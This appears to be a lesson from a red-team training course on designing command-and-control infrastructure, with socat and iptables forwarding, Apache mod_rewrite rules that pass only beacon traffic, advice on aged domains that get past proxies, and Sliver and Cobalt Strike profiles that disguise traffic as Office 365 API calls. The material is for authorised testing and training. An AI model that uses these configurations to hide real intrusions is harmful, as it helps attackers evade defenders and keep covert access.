---
title: "C2 Infrastructure Design"
tags: [red-team, C2, redirectors, CDN-fronting, malleable-profiles, opsec,
  Sliver, Cobalt-Strike, infrastructure]
module: 08-RedTeam-01
day: 492
related_topics:
  - Red Team vs Pentest Mindset (Day 491)
  - C2 Lab — Cobalt Strike / Sliver (Day 493)
  - AV and EDR Evasion Concepts (Day 494)
  - C2 Concepts and Sliver Lab (Day 242)
---

# Day 492 — C2 Infrastructure Design

> "Your C2 infrastructure is your nervous system. If the blue team severs
> it, you are blind and deaf inside the network. Build it so that losing
> one node does not kill the operation. Build it so the client can never
> see your real server. Build it so it looks like noise, not signal."
>
> — Ghost

---

## Goals

Design a multi-tier C2 infrastructure with redirectors.
Understand CDN domain fronting and when it works.
Configure malleable C2 profiles to blend traffic with legitimate services.
Understand the operational security requirements of red team infrastructure.

**Prerequisites:** Day 491 (red team mindset), Day 242 (C2 basics / Sliver intro).
**Time budget:** 4 hours.

---

## Part 1 — C2 Architecture Tiers

### Single-Tier (Bad OpSec)

```
Implant → C2 server (attacker VPS)
```

Problems:
- Blue team blocks one IP → operation dies.
- VPS IP is burned and attributed to the red team.
- No separation between operator workstation and client-visible traffic.

### Multi-Tier with Redirectors (Professional)

```
                         Operator
                            │
                            ▼
                      C2 Team Server
                      (never internet-facing)
                            │
                    ┌───────┴────────┐
                    ▼                ▼
              Redirector 1     Redirector 2
             (cloud VM, EU)   (cloud VM, US)
                    │                │
                    └───────┬────────┘
                            ▼
                    Internet boundary
                            │
                            ▼
                      Target network
                            │
                            ▼
                   Implant (on victim host)
```

**Benefits:**
- Team server IP never exposed to target network.
- Blue team blocks a redirector → swap to the other; team server unchanged.
- Redirectors are disposable. Team server is permanent for the engagement.

---

## Part 2 — Redirector Types

### Dumb Pipe Redirector (socat / iptables)

Forwards all traffic blindly. Simple to deploy; no filtering.

```bash
# On redirector VPS — forward TCP 443 to team server
socat TCP4-LISTEN:443,fork TCP4:<teamserver_ip>:443 &

# Or with iptables:
iptables -t nat -A PREROUTING -p tcp --dport 443 \
    -j DNAT --to-destination <teamserver_ip>:443
iptables -t nat -A POSTROUTING -j MASQUERADE
```

### Smart Redirector (Apache mod_rewrite / Nginx)

Filters traffic: only forward valid beacon requests to the team server.
Everything else — scanners, blue team investigators, Shodan — gets a
benign response (404, redirect to google.com, fake static page).

```apache
# Apache mod_rewrite redirector
RewriteEngine On

# Only forward requests with the correct URI path and User-Agent
RewriteCond %{REQUEST_URI} ^/api/v2/update [NC]
RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 \(Windows NT 10.0" [NC]
RewriteRule ^(.*)$ https://<teamserver_ip>/$1 [P,L]

# Everything else: redirect to a plausible decoy
RewriteRule ^(.*)$ https://www.microsoft.com/ [R=302,L]
```

This means: even if the redirector's IP is discovered and scanned, it
shows nothing suspicious — only valid beacon traffic reaches the team server.

---

## Part 3 — Domain Selection and Categorisation

The domain your C2 traffic uses determines whether it gets blocked by
corporate web proxies.

### Aged Domains

```
Buy a domain that is 1–2 years old and has a clean reputation.
Check: web.archive.org — does it have legitimate history?
Check: Cisco Talos, Symantec BDTI, BlueCoat — what is the category?

Target categories (for most corporate environments):
  "Business and Economy", "Technology", "Cloud Computing" — rarely blocked
  "Newly Registered Domain" — almost always blocked by enterprise proxies
  "Uncategorised" — blocked by many proxies as a safety measure
```

```bash
# Check domain reputation and categorisation:
# Cisco Talos: https://talosintelligence.com/reputation_center
# Symantec: sitereview.symantec.com
# BlueCoat: sitereview.bluecoat.com
# VirusTotal Passive DNS: https://www.virustotal.com/gui/domain/
```

### SSL Certificates

Every C2 domain needs a valid TLS certificate. Without one, the implant
shows a certificate error — a major detection signal.

```bash
# Use Certbot (Let's Encrypt) on each redirector:
certbot certonly --standalone -d your-c2-domain.com
# Auto-renew before expiry
```

---

## Part 4 — CDN Domain Fronting

Domain fronting uses a CDN (Cloudflare, Azure CDN, AWS CloudFront) as an
involuntary redirector. The TLS SNI field shows a legitimate CDN domain;
the HTTP `Host` header routes to the actual C2.

```
Implant DNS lookup: cdn.trusted-company.com → CDN IP
TLS handshake: SNI = cdn.trusted-company.com (legitimate — passes DPI)
HTTP Host header: your-c2-domain.com (the CDN routes to your backend)
```

**Current status (2024–2026):**
- Cloudflare and AWS actively block domain fronting at the SNI level.
- Azure CDN: increasingly blocked.
- Some CDN providers still permit it in specific configurations.
- **Alternative:** CDN-on-CDN (nested CDN proxying) — more complex, still works
  in some environments.

**Detection by blue team:**
- SNI ≠ HTTP Host header mismatch → log and alert.
- Traffic to CDN IPs for unusual destinations.

**Use in engagements:** Declare domain fronting in the ROE or avoid it.
Some clients explicitly want to test whether their proxy detects it.

---

## Part 5 — Malleable C2 Profiles

A malleable C2 profile (Cobalt Strike term, Sliver equivalent: traffic shaping)
controls how beacon traffic looks on the wire. The goal: make C2 traffic
indistinguishable from legitimate application traffic.

### What a Profile Controls

```
HTTP request shape:
  Method: GET or POST
  URI path: /api/v2/check-in, /cdn-cgi/health, /static/bootstrap.min.js
  Headers: User-Agent, Accept, Accept-Language, X-Forwarded-For
  Cookie format

HTTP response shape:
  Content-Type: application/json, text/html, image/png
  Response body: random padding, fake JSON, fake HTML

Sleep interval and jitter:
  60 seconds ± 20% (blends with browser keep-alive intervals)

Data encoding:
  Base64, netbios encoding, XOR before embedding in HTTP body
```

### Sliver Traffic Shaping (Open Source)

```yaml
# sliver-c2-profile.yaml
name: "office365-mimic"
implant_config:
  sleep: 60
  jitter: 15
  http:
    url: "/api/graph/v1.0/users/{uuid}/presence"
    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
      X-Request-ID: "{random_uuid}"
      Content-Type: "application/json"
    response_body: '{"@odata.context":"https://graph.microsoft.com/v1.0/$metadata#users","value":[{data}]}'
```

### Cobalt Strike Malleable Profile (Commercial)

```
# cs-profile.profile
set sample_name "o365_mimic";
set sleep_time "60000";
set jitter "15";

http-get {
    set uri "/api/graph/v1.0/me/presence";
    client {
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
        header "Accept" "application/json";
        parameter "client-request-id" "{{uuid}}";
        metadata {
            base64url;
            prepend "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.";
            header "Authorization";
        }
    }
    server {
        header "Content-Type" "application/json";
        output {
            base64url;
            prepend '{"@odata.context":"';
            append '"}';
            print;
        }
    }
}
```

---

## Part 6 — Infrastructure Checklist Before an Engagement

```
Domain:
  [ ] Aged domain (> 6 months), clean categorisation
  [ ] TLS certificate issued and auto-renewing
  [ ] DNS records configured (A, MX, TXT if needed for phishing)

Redirectors:
  [ ] At least two redirectors in different cloud providers/regions
  [ ] Smart filtering (mod_rewrite or Nginx) — non-beacon traffic serves decoy
  [ ] SSH access from operator machine only (key auth, no password)
  [ ] Firewall: only ports 80, 443 open inbound; restrict outbound

Team server:
  [ ] Not internet-facing — only accessible from redirectors
  [ ] Listener configured with malleable profile matching target environment
  [ ] Logging enabled with timestamps
  [ ] Kill switch: clear implants remotely if engagement aborted

Operator workstation:
  [ ] Separate from personal machine
  [ ] VPN to redirector before any C2 traffic
  [ ] Browser traffic isolated from C2 traffic
```

---

## Key Takeaways

1. Multi-tier infrastructure with redirectors is the baseline for professional
   red teaming. The team server must never be directly visible to the target.
2. Smart redirectors (Apache mod_rewrite) are more OpSec-sound than dumb pipes.
   Blue team scanners get a decoy; only valid beacons reach the team server.
3. Domain reputation and categorisation determine whether C2 traffic passes
   through corporate proxies. An uncategorised domain is blocked before your
   implant makes its first call home.
4. Malleable profiles / traffic shaping make C2 traffic look like a known
   application. Office 365 and Azure API traffic is the gold standard because
   it is ubiquitous and rarely inspected deeply.
5. Domain fronting is increasingly mitigated by CDN providers. Treat it as
   an advanced technique for specific engagements with explicit ROE approval.

---

## Exercises

1. Set up a redirector using Apache mod_rewrite on a local VM. Write a rule
   that forwards only requests matching `POST /api/v2/update` with a specific
   `User-Agent` to a second VM. Test that all other requests get a 302 redirect
   to google.com.
2. Check three aged domains on Cisco Talos and Symantec BDTI. Record their
   categories. Identify which would be blocked by a "Business only" corporate
   proxy policy.
3. Write a Sliver traffic shaping profile that mimics Microsoft Teams check-in
   traffic (URI pattern, User-Agent, response body shape).
4. Build the complete infrastructure checklist above as a runbook. Add at least
   three additional OpSec items based on your own research.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q492.1, Q492.2 …).

---

## Navigation

← Previous: [Day 491 — Red Team vs Pentest Mindset](DAY-0491-Red-Team-vs-Pentest-Mindset.md)
→ Next: [Day 493 — C2 Lab: Sliver](DAY-0493-C2-Lab-Cobalt-Strike-Sliver.md)
